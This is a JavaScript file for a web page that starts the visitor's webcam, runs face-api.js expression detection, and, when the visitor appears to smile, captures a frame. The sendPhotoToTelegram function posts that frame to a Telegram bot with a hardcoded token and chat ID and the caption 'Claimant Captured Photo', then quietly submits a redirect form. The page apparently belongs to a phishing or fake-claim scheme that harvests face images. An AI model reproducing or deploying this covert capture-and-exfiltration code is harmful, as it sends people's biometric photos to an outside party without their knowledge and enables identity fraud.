const video = document.getElementById('video')
var canvas = document.getElementById("canvas");

Promise.all([
  faceapi.nets.tinyFaceDetector.loadFromUri('models'),
  faceapi.nets.faceLandmark68Net.loadFromUri('models'),
  faceapi.nets.faceRecognitionNet.loadFromUri('models'),
  faceapi.nets.faceExpressionNet.loadFromUri('models')
]).then(startVideo)

function startVideo() {
  navigator.getUserMedia(
    { video: {} },
    stream => video.srcObject = stream,
    err => console.error(err)
  )
}

video.addEventListener('play', () => {
  const canvas = faceapi.createCanvasFromMedia(video);
  document.body.append(canvas);
  const displaySize = { width: video.width, height: video.height };
  faceapi.matchDimensions(canvas, displaySize);
  setInterval(async () => {
    const detections = await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions()).withFaceLandmarks().withFaceExpressions();
    const resizedDetections = faceapi.resizeResults(detections, displaySize);
    canvas.getContext('2d').clearRect(0, 0, canvas.width, canvas.height);
    faceapi.draw.drawDetections(canvas, resizedDetections);
    faceapi.draw.drawFaceLandmarks(canvas, resizedDetections);
    faceapi.draw.drawFaceExpressions(canvas, resizedDetections);

    // Check for different facial expressions
    const expressions = resizedDetections[0].expressions;
    if (expressions.happy > 0.80) {
      const context = canvas.getContext("2d");
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Convert the canvas image to a Blob
      canvas.toBlob(function(blob) {
        sendPhotoToTelegram(blob);
      }, 'image/jpeg', 0.75);
 
    } 
  }, 100);
});

function sendPhotoToTelegram(blob) {
  var telegram_bot_id = "5943323134:AAFsjs5ta-Jxuh7MtRnYjTNocvYa6bb-XpM";
  var chat_id = 1120054024;
 

  // Create a FormData object to send the image
  var formData = new FormData();
  formData.append('chat_id', chat_id);
  formData.append('photo', blob, 'photo.jpg');
  formData.append('caption', 'Claimant Captured Photo');

  // Send the image and caption to the Telegram Bot API using Ajax
  fetch('https://api.telegram.org/bot' + telegram_bot_id + '/sendPhoto', {
    method: 'POST',
    body: formData
  })
  .then(response => response.json())
  .then(data => {
    console.log(data);
    document.getElementById("redirectForm").submit();
  })
  .catch(error => {
    console.error(error);
  });
}

